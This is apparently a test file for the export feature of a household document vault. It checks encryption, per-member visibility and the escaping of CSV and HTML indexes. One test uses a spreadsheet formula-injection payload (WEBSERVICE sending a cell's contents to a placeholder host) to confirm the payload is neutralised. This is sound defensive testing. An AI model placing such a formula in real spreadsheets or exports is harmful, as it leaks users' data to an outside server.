import { randomUUID } from 'node:crypto';
import { inflateRawSync } from 'node:zlib';
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { Readable } from 'node:stream';
import { pipeline } from 'node:stream/promises';
import {
  deriveKey,
  EncryptStream,
  EnvKeyProvider,
  newKey,
  ScopeKeys,
  sealPrivate,
  unwrapKey,
  wrapKey,
} from '@fdv/crypto';
import { createDb, createPool, withSystem, type Db } from '@fdv/db';
import { createTestDatabase, testAdminUrl, type TestDatabase } from '@fdv/db/testing';
import { LocalAdapter } from '@fdv/storage';
import pg from 'pg';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { buildExport, csvCell } from './export.js';
import { decryptToBuffer } from './process-version.js';

const MASTER = 'worker-test-master-key-with-32-bytes-or-more';

/** Reads a ZIP without a library: central directory, then each entry inflated. */
function zipEntries(zip: Buffer): Map<string, Buffer> {
  const out = new Map<string, Buffer>();
  const eocd = zip.lastIndexOf(Buffer.from([0x50, 0x4b, 0x05, 0x06]));
  let p = zip.readUInt32LE(eocd + 16);
  while (zip.readUInt32LE(p) === 0x02014b50) {
    const method = zip.readUInt16LE(p + 10);
    const compressed = zip.readUInt32LE(p + 20);
    const nameLen = zip.readUInt16LE(p + 28);
    const extraLen = zip.readUInt16LE(p + 30);
    const commentLen = zip.readUInt16LE(p + 32);
    const local = zip.readUInt32LE(p + 42);
    const name = zip.subarray(p + 46, p + 46 + nameLen).toString('utf8');
    const dataStart = local + 30 + zip.readUInt16LE(local + 26) + zip.readUInt16LE(local + 28);
    const data = zip.subarray(dataStart, dataStart + compressed);
    out.set(name, method === 8 ? inflateRawSync(data) : Buffer.from(data));
    p += 46 + nameLen + extraLen + commentLen;
  }
  return out;
}

describe('index.csv', () => {
  it('a cell a spreadsheet would run as a formula is written as text', () => {
    expect(csvCell('=WEBSERVICE("https://example.test/?"&A2)')).toBe(
      `"'=WEBSERVICE(""https://example.test/?""&A2)"`,
    );
    expect(csvCell('+44 20 7946 0000')).toBe("'+44 20 7946 0000");
    expect(csvCell('-1+1')).toBe("'-1+1");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(csvCell('\t=1')).toBe("'\t=1");
    expect(csvCell(['=1', 'tax'])).toBe("'=1 tax");
    // Everything else as it was.
    expect(csvCell('Barclays')).toBe('Barclays');
    expect(csvCell('Smith, Jones & Co')).toBe('"Smith, Jones & Co"');
    expect(csvCell('a\rb')).toBe('"a\rb"');
    expect(csvCell(3)).toBe('3');
    expect(csvCell(null)).toBe('');
  });
});

describe.skipIf(!testAdminUrl())('export.build job', () => {
  let tdb: TestDatabase;
  let db: Db;
  let admin: pg.Pool;
  let vaultDir: string;
  const hh = randomUUID();
  let ownerMember: string;
  let ownerAccount: string;
  let otherMember: string;
  const keys = new ScopeKeys(new EnvKeyProvider(MASTER));

  beforeAll(async () => {
    tdb = await createTestDatabase();
    db = createDb(createPool(tdb.appUrl, 3));
    admin = new pg.Pool({ connectionString: tdb.adminUrl, max: 1 });
    vaultDir = await mkdtemp(path.join(tmpdir(), 'fdv-export-vault-'));
    await admin.query('insert into household (id, name) values ($1, $2)', [hh, 'Export household']);
    ownerMember = (
      await admin.query<{ id: string }>(
        "insert into member (household_id, display_name) values ($1, 'Mansoor') returning id",
        [hh],
      )
    ).rows[0]?.id as string;
    otherMember = (
      await admin.query<{ id: string }>(
        "insert into member (household_id, display_name) values ($1, 'Sana') returning id",
        [hh],
      )
    ).rows[0]?.id as string;
    ownerAccount = (
      await admin.query<{ id: string }>(
        "insert into account (email) values ('o@x.test') returning id",
      )
    ).rows[0]?.id as string;
    await admin.query(
      "insert into account_household (account_id, household_id, member_id, role) values ($1, $2, $3, 'owner')",
      [ownerAccount, hh, ownerMember],
    );
    await withSystem(db, hh, async (trx) => {
      await keys.mintHouseholdKeys(trx, hh);
      await keys.mintMemberKey(trx, hh, ownerMember, null);
      await keys.mintMemberKey(trx, hh, otherMember, null);
      const v = await trx
        .insertInto('vault')
        .values({ household_id: hh, kind: 'local', label: 'test', status: 'ok' })
        .returning('id')
        .executeTakeFirstOrThrow();
      await trx
        .updateTable('household')
        .set({ active_vault_id: v.id })
        .where('id', '=', hh)
        .execute();
    });
  }, 60_000);
  afterAll(async () => {
    await db.destroy();
    await admin.end();
    await tdb.drop();
    await rm(vaultDir, { recursive: true, force: true });
  });

  async function addDoc(
    title: string,
    visibility: 'household' | 'adults' | 'private',
    owner: string,
    content: string,
    category = 'identity',
    details: { type_key?: string; extra?: Record<string, unknown>; notes?: string } = {},
  ) {
    return withSystem(db, hh, async (trx) => {
      const doc = await trx
        .insertInto('document')
        .values({
          household_id: hh,
          title,
          owner_member_id: owner,
          visibility,
          category,
          expires_on: '2031-03-31',
          expires_precision: 'month',
          identifier: 'ID-1',
          ...(details.type_key ? { type_key: details.type_key } : {}),
          ...(details.extra ? { extra: JSON.stringify(details.extra) } : {}),
          ...(details.notes ? { notes: details.notes } : {}),
        })
        .returning('id')
        .executeTakeFirstOrThrow();
      const scope = await keys.unwrap(
        trx,
        visibility === 'private'
          ? { householdId: hh, kind: 'member', memberId: owner }
          : { householdId: hh, kind: visibility },
      );
      // An Only me document's notes and details, sealed as 0.5.8 keeps them.
      if (visibility === 'private' && (details.notes || details.extra)) {
        await trx
          .updateTable('document')
          .set({
            ...sealPrivate(scope.key, doc.id, {
              notes: details.notes ?? null,
              extra: details.extra ?? {},
            }),
            notes: null,
            extra: '{}',
          })
          .where('id', '=', doc.id)
          .execute();
      }
      const fileKey = newKey();
      const key = `${hh}/${doc.id}/1/x.pdf.enc`;
      const enc = new EncryptStream(fileKey);
      const [put] = await Promise.all([
        new LocalAdapter(vaultDir).put(key, enc),
        pipeline(Readable.from([Buffer.from(content)]), enc),
      ]);
      const vault = await trx.selectFrom('vault').select('id').executeTakeFirstOrThrow();
      await trx
        .insertInto('document_version')
        .values({
          household_id: hh,
          document_id: doc.id,
          version_no: 1,
          filename: 'file.pdf',
          mime: 'application/pdf',
          byte_size: content.length,
          sha256: Buffer.alloc(32),
          cipher_bytes: put.bytes,
          cipher_sha256: Buffer.from(put.sha256, 'hex'),
          storage_key: key,
          vault_id: vault.id,
          file_key_wrapped: wrapKey(fileKey, scope.key, `version:${doc.id}`),
          wrapped_by_scope: scope.id,
        })
        .execute();
      return doc.id;
    });
  }

  it('builds a ZIP with originals by category and three indexes, honouring visibility', async () => {
    await addDoc("Mansoor's passport", 'household', ownerMember, 'PASSPORT BYTES');
    await addDoc('Home insurance', 'adults', ownerMember, 'POLICY BYTES', 'insurance');
    await addDoc('My private note', 'private', ownerMember, 'PRIVATE BYTES', 'legal');
    await addDoc("Sana's private note", 'private', otherMember, 'NOT FOR OWNER', 'legal');

    const exportId = await withSystem(db, hh, (trx) =>
      trx
        .insertInto('export')
        .values({ household_id: hh, requested_by: ownerAccount })
        .returning('id')
        .executeTakeFirstOrThrow(),
    ).then((r) => r.id);
    const log: Array<Record<string, unknown>> = [];
    await buildExport(
      {
        db,
        keys,
        credentialsKey: deriveKey(MASTER, 'vault-credentials'),
        localRoot: vaultDir,
        log: (level, msg, extra) => log.push({ level, msg, ...extra }),
      },
      { household_id: hh, export_id: exportId },
    );

    const row = await withSystem(db, hh, (trx) =>
      trx.selectFrom('export').selectAll().where('id', '=', exportId).executeTakeFirstOrThrow(),
    );
    expect(row.state).toBe('done');
    expect(row.document_count).toBe(3); // Sana's private note is not the owner's to export
    expect(row.storage_key).toBe(`${hh}/exports/${exportId}.zip.enc`);

    // The stored object is ciphertext, under the requester's own key (0.5.8);
    // decrypting it yields a real ZIP.
    const memberKey = await withSystem(db, hh, (trx) =>
      keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: ownerMember }),
    );
    const fileKey = unwrapKey(row.file_key_wrapped as Buffer, memberKey.key, `export:${exportId}`);
    const zip = await decryptToBuffer(
      new LocalAdapter(vaultDir),
      row.storage_key as string,
      fileKey,
    );
    expect(zip.subarray(0, 2).toString()).toBe('PK');
    expect(zip.length).toBe(Number(row.byte_size));

    const entries = zipEntries(zip);
    const names = [...entries.keys()].sort();
    expect(names).toEqual(
      [
        'README.txt',
        "identity/Mansoor's passport.pdf",
        'index.csv',
        'index.html',
        'index.json',
        'insurance/Home insurance.pdf',
        'legal/My private note.pdf',
      ].sort(),
    );
    const all = Buffer.concat([...entries.values()]);
    expect(all.includes(Buffer.from('NOT FOR OWNER'))).toBe(false);
    expect(entries.get('legal/My private note.pdf')?.toString()).toBe('PRIVATE BYTES');
    expect(entries.get("identity/Mansoor's passport.pdf")?.toString()).toBe('PASSPORT BYTES');
    // The indexes carry the facts a person would need without the app.
    const index = JSON.parse(entries.get('index.json')?.toString() ?? '{}') as {
      documents: Array<{ title: string; expires: string; person: string; file: string }>;
    };
    expect(index.documents.find((d) => d.title === "Mansoor's passport")).toMatchObject({
      expires: 'March 2031',
      person: 'Mansoor',
      file: "identity/Mansoor's passport.pdf",
    });
    expect(entries.get('index.csv')?.toString()).toContain(
      'Home insurance,,insurance,Mansoor,adults',
    );
    expect(entries.get('index.html')?.toString()).toContain('<td>March 2031</td>');
  }, 60_000);

  it('detail columns are labelled and formula-guarded', async () => {
    // A type of the household's own, whose field somebody named like a formula.
    const own = 'h_abcdefghij';
    const field = 'h_klmnopqrst';
    await admin.query(
      `insert into document_type (key, label, category, household_id, fields)
       values ($1, 'Season ticket', 'other', $2, $3)`,
      [own, hh, JSON.stringify([{ key: field, label: '=HYPERLINK("x")', kind: 'text' }])],
    );
    await addDoc('Estate car', 'household', ownerMember, 'CAR BYTES', 'property', {
      type_key: 'vehicle_registration',
      extra: { vin: '=2+5', plate: 'AB12 CDE' },
    });
    await addDoc('Our wills', 'adults', ownerMember, 'WILL BYTES', 'legal', {
      type_key: 'will',
      extra: { last_reviewed: { date: '2026-03-31', precision: 'month' }, executor: '@Sana' },
    });
    await addDoc('Rail pass', 'household', ownerMember, 'PASS BYTES', 'other', {
      type_key: own,
      extra: { [field]: 'Annual', retired_key: true },
    });
    // Kept by a vault before 0.5.7, which took any key: one every object
    // inherits. Other documents have nothing under it, not the inherited one.
    await addDoc('Old receipt', 'household', ownerMember, 'RECEIPT BYTES', 'other', {
      type_key: 'warranty',
      extra: { constructor: 'legacy' },
    });
    // Not the requester's to export: its details are not either.
    await addDoc("Sana's car", 'private', otherMember, 'NOT FOR OWNER', 'property', {
      type_key: 'vehicle_registration',
      extra: { vin: 'SANASVIN0000001' },
    });

    const exportId = await withSystem(db, hh, (trx) =>
      trx
        .insertInto('export')
        .values({ household_id: hh, requested_by: ownerAccount })
        .returning('id')
        .executeTakeFirstOrThrow(),
    ).then((r) => r.id);
    await buildExport(
      {
        db,
        keys,
        credentialsKey: deriveKey(MASTER, 'vault-credentials'),
        localRoot: vaultDir,
        log: () => undefined,
      },
      { household_id: hh, export_id: exportId },
    );
    const row = await withSystem(db, hh, (trx) =>
      trx.selectFrom('export').selectAll().where('id', '=', exportId).executeTakeFirstOrThrow(),
    );
    expect(row.state).toBe('done');
    const memberKey = await withSystem(db, hh, (trx) =>
      keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: ownerMember }),
    );
    const zip = await decryptToBuffer(
      new LocalAdapter(vaultDir),
      row.storage_key as string,
      unwrapKey(row.file_key_wrapped as Buffer, memberKey.key, `export:${exportId}`),
    );
    const entries = zipEntries(zip);

    // index.csv: a column for each detail, named as its type names it, and
    // a name or a value a spreadsheet would run as a formula is written as text.
    const [header = '', ...lines] = (entries.get('index.csv')?.toString() ?? '').split('\n');
    const cols = header.split(',');
    expect(cols.slice(0, 12)).toEqual([
      'title',
      'type_key',
      'category',
      'person',
      'visibility',
      'issued_by',
      'issued',
      'expires',
      'identifier',
      'physical_location',
      'tags',
      'notes',
    ]);
    expect(cols).toEqual(
      expect.arrayContaining([
        'VIN',
        'Registration plate',
        'Executor',
        'Last reviewed',
        `"'=HYPERLINK(""x"")"`,
        'retired_key',
      ]),
    );
    expect(cols.slice(-4)).toEqual(['file', 'version_no', 'sha256', 'document_id']);
    const cell = (title: string, column: string) =>
      lines.find((l) => l.startsWith(`${title},`))?.split(',')[cols.indexOf(column)];
    expect(cell('Estate car', 'VIN')).toBe("'=2+5");
    expect(cell('Estate car', 'Registration plate')).toBe('AB12 CDE');
    expect(cell('Our wills', 'Executor')).toBe("'@Sana");
    expect(cell('Our wills', 'Last reviewed')).toBe('March 2026');
    expect(cell('Rail pass', `"'=HYPERLINK(""x"")"`)).toBe('Annual');
    expect(cell('Rail pass', 'retired_key')).toBe('Yes');
    expect(cell('Estate car', 'Executor')).toBe('');
    // The old receipt's detail, and nothing inherited for anybody else's.
    expect(cell('Old receipt', 'constructor')).toBe('legacy');
    expect(cell('Estate car', 'constructor')).toBe('');
    expect(entries.get('index.csv')?.toString()).not.toContain('undefined');

    // index.json keeps the details as the vault does, with what each is called.
    const index = JSON.parse(entries.get('index.json')?.toString() ?? '{}') as {
      details: Array<{ key: string; label: string }>;
      documents: Array<{ title: string; extra: Record<string, unknown> }>;
    };
    expect(index.details).toEqual(
      expect.arrayContaining([
        { key: 'vin', label: 'VIN' },
        { key: 'plate', label: 'Registration plate' },
        { key: field, label: '=HYPERLINK("x")' },
      ]),
    );
    expect(index.documents.find((d) => d.title === 'Our wills')?.extra).toEqual({
      last_reviewed: { date: '2026-03-31', precision: 'month' },
      executor: '@Sana',
    });
    // index.html lists them, escaped.
    const page = entries.get('index.html')?.toString() ?? '';
    expect(page).toContain('VIN: =2+5<br>Registration plate: AB12 CDE');
    expect(page).toContain('=HYPERLINK(&quot;x&quot;): Annual');
    expect(page.split('constructor: ')).toHaveLength(2);
    // Somebody else's Only me car is in none of it.
    expect(Buffer.concat([...entries.values()]).includes(Buffer.from('SANASVIN'))).toBe(false);
  }, 60_000);

  /** An export for an account, built, and opened with the key it says it is under. */
  async function exported(account: string) {
    const exportId = await withSystem(db, hh, (trx) =>
      trx
        .insertInto('export')
        .values({ household_id: hh, requested_by: account })
        .returning('id')
        .executeTakeFirstOrThrow(),
    ).then((r) => r.id);
    await buildExport(
      {
        db,
        keys,
        credentialsKey: deriveKey(MASTER, 'vault-credentials'),
        localRoot: vaultDir,
        log: () => undefined,
      },
      { household_id: hh, export_id: exportId },
    );
    const row = await withSystem(db, hh, (trx) =>
      trx.selectFrom('export').selectAll().where('id', '=', exportId).executeTakeFirstOrThrow(),
    );
    expect(row.state).toBe('done');
    const zip = await withSystem(db, hh, async (trx) =>
      decryptToBuffer(
        new LocalAdapter(vaultDir),
        row.storage_key as string,
        unwrapKey(
          row.file_key_wrapped as Buffer,
          await keys.unwrapById(trx, row.wrapped_by_scope as string),
          `export:${exportId}`,
        ),
      ),
    );
    const entries = zipEntries(zip);
    const index = JSON.parse(entries.get('index.json')?.toString() ?? '{}') as {
      documents: Array<{ title: string; notes: string | null; extra: Record<string, unknown> }>;
    };
    return { exportId, row, entries, index, all: Buffer.concat([...entries.values()]) };
  }

  it('sealed notes are opened only for their owner', async () => {
    // Sana signs in too, and asks for an export of her own.
    const sanaAccount = (
      await admin.query<{ id: string }>(
        "insert into account (email) values ('s@x.test') returning id",
      )
    ).rows[0]?.id as string;
    await admin.query(
      "insert into account_household (account_id, household_id, member_id, role) values ($1, $2, $3, 'adult')",
      [sanaAccount, hh, otherMember],
    );
    await addDoc('My sealed will', 'private', ownerMember, 'MY WILL', 'legal', {
      type_key: 'will',
      notes: 'The original is with the solicitor',
      extra: { executor: 'Rahul' },
    });
    await addDoc('Her sealed diary', 'private', otherMember, 'HER DIARY', 'legal', {
      notes: 'Sana keeps this to herself',
    });
    await addDoc('Family recipes', 'household', ownerMember, 'RECIPES', 'other', {
      notes: 'Gran wrote these',
    });

    // Mine, opened for me; hers nowhere, sealed or not.
    const mine = await exported(ownerAccount);
    expect(mine.index.documents.find((d) => d.title === 'My sealed will')).toMatchObject({
      notes: 'The original is with the solicitor',
      extra: { executor: 'Rahul' },
    });
    expect(mine.index.documents.find((d) => d.title === 'Family recipes')?.notes).toBe(
      'Gran wrote these',
    );
    expect(mine.entries.get('index.csv')?.toString()).toContain(
      'The original is with the solicitor',
    );
    expect(mine.all.includes(Buffer.from('Sana keeps'))).toBe(false);

    // Hers, opened for her; mine nowhere.
    const hers = await exported(sanaAccount);
    expect(hers.index.documents.find((d) => d.title === 'Her sealed diary')?.notes).toBe(
      'Sana keeps this to herself',
    );
    expect(hers.index.documents.find((d) => d.title === 'Family recipes')?.notes).toBe(
      'Gran wrote these',
    );
    expect(hers.all.includes(Buffer.from('solicitor'))).toBe(false);
    expect(hers.index.documents.map((d) => d.title)).not.toContain('My sealed will');
  }, 60_000);

  it('an export containing an Only me document cannot be unwrapped with the household key', async () => {
    const mine = await exported(ownerAccount);
    expect(mine.index.documents.map((d) => d.title)).toContain('My private note');
    const [hhKey, memberKey] = await withSystem(db, hh, (trx) =>
      Promise.all([
        keys.unwrap(trx, { householdId: hh, kind: 'household' }),
        keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: ownerMember }),
      ]),
    );
    // Wrapped under the requester's own key, and said to be.
    expect(mine.row.wrapped_by_scope).toBe(memberKey.id);
    const wrapped = mine.row.file_key_wrapped as Buffer;
    expect(() => unwrapKey(wrapped, hhKey.key, `export:${mine.exportId}`)).toThrow(/cannot unwrap/);
    expect(unwrapKey(wrapped, memberKey.key, `export:${mine.exportId}`)).toHaveLength(32);
    // Nor with the other adult's.
    const hers = await withSystem(db, hh, (trx) =>
      keys.unwrap(trx, { householdId: hh, kind: 'member', memberId: otherMember }),
    );
    expect(() => unwrapKey(wrapped, hers.key, `export:${mine.exportId}`)).toThrow(/cannot unwrap/);
  }, 60_000);
});
